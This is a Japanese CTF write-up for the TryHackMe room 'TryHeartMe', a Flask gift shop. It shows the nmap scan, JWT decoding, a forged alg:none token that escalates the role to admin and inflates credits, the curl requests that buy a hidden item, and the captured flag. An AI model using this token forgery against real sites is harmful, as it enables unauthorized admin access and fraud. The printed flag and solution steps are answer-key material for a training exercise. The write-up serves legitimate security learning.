---
tags: [hacking, box, writeup]
platform: TryHackMe
difficulty: Easy
status: completed
date: 2026-03-30
url: https://tryhackme.com/room/lafb2026e5
skills:
  - JWT alg:none攻撃
  - JWTペイロード改ざん
  - 権限昇格（role: user → admin）
  - クレジット改ざん
---

# TryHeartMe

**プラットフォーム**: TryHackMe
**難易度**: Easy
**OS**: Linux
**概要**: バレンタインデーのギフトショップで隠されたアイテムにアクセスする

---

## 情報収集

### Nmap

```bash
nmap -sC -sV -p- --min-rate 5000 10.144.189.104 -oN nmap/ports
```

**開いているポート:**
| ポート | サービス | バージョン |
|-------|---------|----------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 5000 | HTTP | Werkzeug/3.0.1 Python/3.12.3 |

### Webアプリ調査

ポート5000にFlask製ショッピングサイト「TryHeartMe」が動作。

**商品一覧（ゲスト時）:**
| 商品名 | 価格 |
|-------|------|
| Rose Bouquet (12 stems) | 120 credits |
| Heart Chocolates (Box) | 85 credits |
| Chocolate-Dipped Strawberries | 60 credits |
| Love Letter Card | 25 credits |

購入にはアカウントが必要。`/login` と `/register` エンドポイントが存在。

---

## 脆弱性発見

### JWTクッキーの発見

`/register` でアカウントを作成すると、レスポンスの **Set-Cookie** ヘッダーにJWTが返却される。

```bash
curl -v -X POST http://10.144.189.104:5000/register \
  -d "email=test@test.com&password=test123&next="
```

レスポンス:
```
Set-Cookie: tryheartme_jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
```

### JWTペイロードの解析

JWTのペイロード部分（中央のセグメント）をBase64デコードすると：

```bash
echo "eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoidXNlciIsImNyZWRpdHMiOjAsImlhdCI6MTc3NDg2MTYyNSwidGhlbWUiOiJ2YWxlbnRpbmUifQ" | base64 -d
```

```json
{
  "email": "test@test.com",
  "role": "user",
  "credits": 0,
  "iat": 1774861625,
  "theme": "valentine"
}
```

`role` と `credits` がJWT内で管理されていることを確認。
サーバーが **alg:none** を受け入れるか試みる。

---

## 侵入 / Initial Access（JWT改ざん）

### alg:none 攻撃

JWTの署名アルゴリズムを `none` に変更し、署名なしで改ざんしたペイロードを受け入れさせる攻撃。

**改ざんしたJWT生成手順:**

```bash
# ヘッダー: {"alg":"none","typ":"JWT"}
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')

# ペイロード: role を admin に、credits を 9999 に改ざん
PAYLOAD=$(echo -n '{"email":"test@test.com","role":"admin","credits":9999,"iat":1774861625,"theme":"valentine"}' | base64 | tr -d '=' | tr '+/' '-_')

# 署名なしトークン（末尾の . が重要）
TOKEN="${HEADER}.${PAYLOAD}."
```

**生成されたトークン:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6InRlc3RAdGVzdC5jb20iLCJyb2xlIjoiYWRtaW4iLCJjcmVkaXRzIjo5OTk5LCJpYXQiOjE3NzQ4NjE2MjUsInRoZW1lIjoidmFsZW50aW5lIn0.
```

### 管理者としてアクセス

```bash
curl -s http://10.144.189.104:5000/ \
  -H "Cookie: tryheartme_jwt=<改ざんトークン>"
```

**結果:**
- ナビゲーションに `/admin` リンクが出現
- クレジットが `9999` に
- 通常非表示の **ValenFlag (777 credits)** 商品が出現

### 管理者パネル確認

```bash
curl -s http://10.144.189.104:5000/admin \
  -H "Cookie: tryheartme_jwt=<改ざんトークン>"
```

> Staff session detected. Staff can purchase the ValenFlag item.

---

## フラグ取得

### ValenFlag の購入

```bash
# 購入リクエスト（POST）
curl -v -X POST http://10.144.189.104:5000/buy/valenflag \
  -H "Cookie: tryheartme_jwt=<改ざんトークン>"
# → 302 リダイレクト to /receipt/valenflag
# → 新しいJWT（残クレジット更新済み）が発行される

# レシートページへアクセス（新JWTを使用）
curl -s http://10.144.189.104:5000/receipt/valenflag \
  -H "Cookie: tryheartme_jwt=<新JWT>"
```

**フラグ:**

```
THM{v4l3nt1n3_jwt_c00k13_t4mp3r_4dm1n_sh0p}
```

---

## 攻略フロー

```
1. Nmap スキャン
   → ポート 22(SSH), 5000(Flask)

2. /register でアカウント作成
   → レスポンスの Set-Cookie に JWT が含まれる

3. JWT ペイロードをBase64デコード
   → role:"user", credits:0 を確認

4. alg:none 攻撃
   → ヘッダーを {"alg":"none"} に変更
   → ペイロードを role:"admin", credits:9999 に改ざん
   → 署名なし（末尾 . のみ）でトークン生成

5. 改ざんJWTでアクセス
   → /admin パネル出現
   → 隠し商品 /product/valenflag (777 credits) 出現

6. POST /buy/valenflag → /receipt/valenflag
   → フラグ取得
```

---

## 習得スキル・学び

- **JWT alg:none 攻撃**: `alg` を `none` にすることで署名検証をスキップさせる
- **JWT構造の理解**: `ヘッダー.ペイロード.署名` の3部構成、各部はBase64URLエンコード
- **クライアントサイド信頼の危険性**: サーバーサイドで管理すべき `role` や `credits` をJWT（クライアントが保持）に含めるのは脆弱
- **Set-Cookie からの情報収集**: 登録・ログインレスポンスのヘッダーに重要情報が含まれることがある

## ハマったポイント

- 購入時に `-L`（リダイレクト追従）を使うと 405 エラーになる
  → POSTのリダイレクト先に再度POSTしようとするため。`-L` なしでリダイレクト先URLを取得し、別途GETで叩く必要があった

## 参考にしたリソース

- [JWT alg:none 攻撃解説 (PortSwigger)](https://portswigger.net/web-security/jwt/algorithm-confusion)
